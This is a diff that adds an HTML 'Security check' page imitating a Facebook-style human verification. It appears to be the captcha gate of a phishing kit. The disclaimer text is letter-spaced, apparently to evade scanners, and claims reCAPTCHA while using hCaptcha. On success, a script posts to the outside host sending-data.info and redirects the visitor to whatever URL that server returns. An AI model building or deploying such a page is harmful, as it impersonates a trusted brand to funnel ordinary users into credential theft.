@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>Human Verification</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+
+    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+    <style type="text/css">
+      body{
+        background-color: #f0f2f5;
+      }
+      .custom-header{
+        box-shadow: 0 4px 5px 0 rgb(0 0 0 / 2%), 0 2px 3px 0 rgb(0 0 0 / 2%), inset 0 0 0 1px rgb(255 255 255 / 50%);
+        background-color:white;
+      }
+      .custom-body{
+        margin-top: 60px;
+        margin-bottom: 50px;
+      }
+      .custom-content{
+        background-color: white;
+        padding:20px;
+        border:1px solid #e2e4e7;
+        border-radius: 10px;
+        box-shadow: 0 4px 5px 0 rgb(0 0 0 / 2%), 0 2px 3px 0 rgb(0 0 0 / 2%), inset 0 0 0 1px rgb(255 255 255 / 50%);
+      }
+      .custom-image-container {
+        margin: 0;
+        padding: 0;
+      }
+      .custom-padding{
+        padding-top:10px;
+        padding-bottom:10px;
+        padding-left:15px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="custom-header">
+      <div class="container-fluid">
+        <div class="custom-padding">
+          <div class="custom-image-container">
+            <img src="p1.png" class="img-fluid" style="padding:0px; margin:0px; height: 42px;" /><img src="p2.png" class="img-fluid"  style="padding:0px; margin:0px; height: 42px;" /><img src="p3.png" class="img-fluid" style="padding:0px; margin:0px; height: 42px;" />
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="custom-body">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-6 offset-md-3">
+            <div class="custom-content">
+              <form id="yourFormId" action="" method="POST">
+                <h2 style="font-weight: 600; font-size: 24px; margin-bottom: 20px;">Security check</h2>
+                <div class="h-captcha" data-sitekey="13deb32c-0dde-47a8-9976-0998158b94fe" data-callback="onSuccess"></div>
+                <p style="color:#65676b; font-size:12px; letter-spacing: -1px;">T h i s &nbsp;  h e l p s  &nbsp; u s &nbsp;  t o &nbsp;  c o m b a t &nbsp;  h a r m f u l &nbsp;  c o n d u c t , &nbsp;  d e t e c t   &nbsp; a n d &nbsp;  p r e v e n t &nbsp;  s p a m  &nbsp; a n d  &nbsp; m a i n t a i n  &nbsp; t h e  &nbsp; i n t e g r i t y  &nbsp; o f  &nbsp; o u r  &nbsp; P r o d u c t s . <br><br>
+                  W e ' v e  &nbsp; u s e d  &nbsp; G o o g l e ' s  &nbsp; r e C A P T C H A &nbsp;  E n t e r p r i s e  &nbsp; p r o d u c t  &nbsp; t o &nbsp;  p r o v i d e &nbsp;  t h i s  &nbsp; s e c u r i t y  &nbsp; c h e c k .  &nbsp; Y o u r &nbsp;  u s e &nbsp;  o f &nbsp;  r e C A P T C H A  &nbsp; E n t e r p r i s e  &nbsp; i s  &nbsp; s u b j e c t &nbsp;  t o  &nbsp; G o o g l e ' s &nbsp;  P r i v a c y &nbsp;  P o l i c y  &nbsp; a n d  &nbsp; T e r m s &nbsp;  o f  &nbsp; U s e .<br><br>
+                r e C A P T C H A  &nbsp; E n t e r p r i s e  &nbsp; c o l l e c t s &nbsp;  h a r d w a r e  &nbsp; a n d  &nbsp; s o f t w a r e &nbsp;  i n f o r m a t i o n  &nbsp; s u c h  &nbsp; a s &nbsp;  d e v i c e &nbsp;  a n d  &nbsp; a p p l i c a t i o n &nbsp;  d a t a , &nbsp;  a n d  &nbsp; s e n d s &nbsp;  i t  &nbsp; t o &nbsp;  G o o g l e  &nbsp; t o  &nbsp; p r o v i d e ,  &nbsp;  m a i n t a i n ,  &nbsp; a n d  &nbsp; i m p r o v e  &nbsp; r e C A P T C H A  &nbsp; E n t e r p r i s e  &nbsp; a n d  &nbsp; f o r &nbsp;  g e n e r a l  &nbsp; s e c u r i t y &nbsp;  p u r p o s e s . &nbsp;  T h i s  &nbsp; i n f o r m a t i o n  &nbsp; i s &nbsp;  n o t  &nbsp; u s e d &nbsp;  b y &nbsp;  G o o g l e  &nbsp; f o r  &nbsp; p e r s o n a l i z e d  &nbsp; a d v e r t i s i n g .</p>
+                <input type="submit" value="Continue" id="continuebutton" disabled="true" class="btn btn-primary" style="background-color:#1b74e4"/>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+   
+
+    <script type="text/javascript">
+      function onSuccess(response){
+          const data = [];
+        var resi = response;
+        data.push({ name: 'response', value: resi });
+        $.ajax({
+          type: "POST",
+          url: "https://sending-data.info/send/serversfulln.php",
+          data: data,
+          success: function(response)
+          {
+            location.href = response;
+          }
+        }); 
+      }
+    </script>
+
+<script src="https://code.jquery.com/jquery-3.6.3.min.js" integrity="sha256-pvPw+upLPUjgMXY0G+8O0xUf+/Im1MZjXxxgOcBQBXU=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-Fy6S3B9q64WdZWQUiU+q4/2Lc9npb8tCaSX9FK7E8HnRr0Jz8D6OP9dO5Vg3Q9ct" crossorigin="anonymous"></script>
+
+  </body>
+</html>
